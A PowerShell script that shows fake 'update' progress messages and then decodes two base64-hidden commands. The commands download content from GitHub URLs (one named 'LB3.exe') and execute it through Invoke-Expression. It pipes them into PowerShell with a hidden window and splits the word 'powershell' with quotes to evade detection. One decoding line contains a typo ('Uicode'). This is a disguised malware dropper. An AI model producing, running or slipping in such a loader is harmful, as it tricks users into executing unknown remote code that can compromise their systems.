echo "[!] Preparing System for Update"
echo "[*] ============================"
start-sleep -s 1
echo "[*]"
start-sleep -s 1
echo "[*]"
start-sleep -s 1
echo "[*]"
echo "[!] Starting Update Process."
echo "[*] ============================"
start-sleep -s 4
echo "[*]"
start-sleep -s 4
echo "[*]"
start-sleep -s 4
echo "[*]"

$a1 = "SQBuAHYAbwBrAGUALQBlAHgAcAByAGUAcwBzAGkAbwBuACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHQAZQBzAHQAcwBwAGEAYwBlADEAOAAvAEMATwBNAEUALQBUAEEASwBFADIALwBhADEAJwApAA=="
$r1 = "SQBuAHYAbwBrAGUALQBlAHgAcAByAGUAcwBzAGkAbwBuACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHQAZQBzAHQAcwBwAGEAYwBlADEAOAAvAEMATwBNAEUALQBUAEEASwBFADIALwBMAEIAMwAuAGUAeABlACcAKQA="

echo "[*]"
start-sleep -s 4
echo "[!] Update Process Completed"
start-sleep -s 4


$update_a1 = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($a1))
$update_r1 = [System.Text.Encoding]::Uicode.GetString([System.Convert]::FromBase64String($r1))

echo $update_a1 | pow""ersh""ell -nop - ; echo $update_r1 | pow""e""rsh""ell -nop -windowstyle hidden -

